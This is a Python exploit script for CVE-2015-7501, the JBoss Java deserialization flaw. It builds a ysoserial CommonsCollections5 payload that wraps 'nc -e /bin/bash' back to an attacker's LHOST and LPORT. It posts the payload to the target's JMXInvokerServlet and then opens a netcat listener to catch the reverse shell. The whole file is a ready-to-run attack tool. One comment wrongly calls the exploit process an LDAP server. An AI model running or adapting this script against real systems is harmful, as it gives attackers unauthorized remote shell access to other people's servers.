#!/usr/bin/env python2
#-*- coding: utf-8 -*- #########################################################################################
#▐▄▄▄▄▄▄▄·       .▄▄ · .▄▄ · ·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .                                       #
#·██▐█ ▀█▪▪     ▐█ ▀. ▐█ ▀. ██▪ ██ ▀▄.▀·▐█ ▀. ▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·                                        #
#▪▄ ██▐█▀▀█▄ ▄█▀▄ ▄▀▀▀█▄▄▀▀▀█▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄                                      #
#▐▌▐█▌██▄▪▐█▐█▌.▐▌▐█▄▪▐█▐█▄▪▐███. ██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌                                      #
#▀▀▀•·▀▀▀▀  ▀█▄▀▪ ▀▀▀▀  ▀▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀                                        #
# jboss6_deser_rce - nighter                                                                                   #
#                                                                                                              #
# DATE                                                                                                         #
# 05/10/2018                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
#                                                                                                              #
# CVE-2015-7501 - Red Hat JBoss A-MQ 6.x; BPM Suite (BPMS) 6.x; BRMS 6.x and 5.x; Data Grid (JDG) 6.x;         #
# Data Virtualization (JDV) 6.x and 5.x; Enterprise Application Platform 6.x, 5.x, and 4.3.x;                  #
# Fuse 6.x; Fuse Service Works (FSW) 6.x; Operations Network (JBoss ON) 3.x; Portal 6.x;                       #
# SOA Platform (SOA-P) 5.x; Web Server (JWS) 3.x; Red Hat OpenShift/xPAAS 3.x; and                             #
# Red Hat Subscription Asset Manager 1.3 allow remote attackers to execute arbitrary commands via a crafted    #
#                                                                                                              #
# nighter - http://nighter.se/                                                                                 #
#                                                                                                              #
################################################################################################################

import signal
import os
import sys
import time
import requests
import commands

from multiprocessing import Process


# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def exploit():

    time.sleep(3)
    payload = commands.getoutput("java -jar ./ysoserial.jar CommonsCollections5 'nc %s %s -e /bin/bash'" % (LHOST, LPORT))

    _url = '%s/invoker/JMXInvokerServlet' % URL

    try:
        r = requests.post(url=_url, data=payload)

        print("[+] Exploit")
    except:
        print("[-] Exploit failed.")


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
 ▐▄▄▄▄▄▄▄·       .▄▄ · .▄▄ · ·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
  ·██▐█ ▀█▪▪     ▐█ ▀. ▐█ ▀. ██▪ ██ ▀▄.▀·▐█ ▀. ▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·
▪▄ ██▐█▀▀█▄ ▄█▀▄ ▄▀▀▀█▄▄▀▀▀█▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐▌▐█▌██▄▪▐█▐█▌.▐▌▐█▄▪▐█▐█▄▪▐███. ██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀•·▀▀▀▀  ▀█▄▀▪ ▀▀▀▀  ▀▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./jboss6_deser_rce.py 'http://127.0.0.1:8080' 192.168.1.81 1337\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print("[+] LHOST = %s" % LHOST)

    # Run ldap server async
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)